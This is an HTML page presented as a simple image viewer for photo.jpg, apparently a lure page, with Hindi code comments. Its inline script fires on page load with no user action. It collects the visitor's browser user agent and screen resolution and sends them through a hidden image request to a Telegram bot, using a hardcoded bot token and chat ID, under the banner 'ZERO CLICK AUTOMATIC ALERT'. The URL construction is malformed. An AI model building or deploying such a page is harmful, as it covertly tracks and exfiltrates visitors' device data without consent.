<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: black; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; user-select: none; }
        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
    </style>
</head>
<body>

    <!-- 📷 फोटो हमेशा तुरंत लोड होगी -->
    <img src="photo.jpg" alt="Image Viewer">

    <script>
        // बिना किसी क्लाउडफ्लेयर वर्कर या गूगल स्क्रिप्ट के सीधे काम करने वाला कोड
        (function() {
            const token = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
            const chatId = "1798743066"; 

            const userAgentText = navigator.userAgent;
            const screenRes = window.screen.width + "x" + window.screen.height;

            const textMessage = "🔔 *ZERO CLICK AUTOMATIC ALERT* 🔔\n\n📱 *Device Info:* `" + userAgentText + "`\n🖥️ *Screen Size:* `" + screenRes + "`";
            
            // ⚡ सीधे टेलीग्राम सर्वर का 100% सही URL पाथ
            const finalUrl = "https://telegram.org" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(textMessage) + "&parse_mode=Markdown";
            
            // बिना स्क्रीन छुए, पेज खुलते ही तुरंत बोट को मैसेज भेजने का सबसे अचूक तरीका
            const ping = new Image();
            ping.src = finalUrl;
        })();
    </script>

</body>
</html>
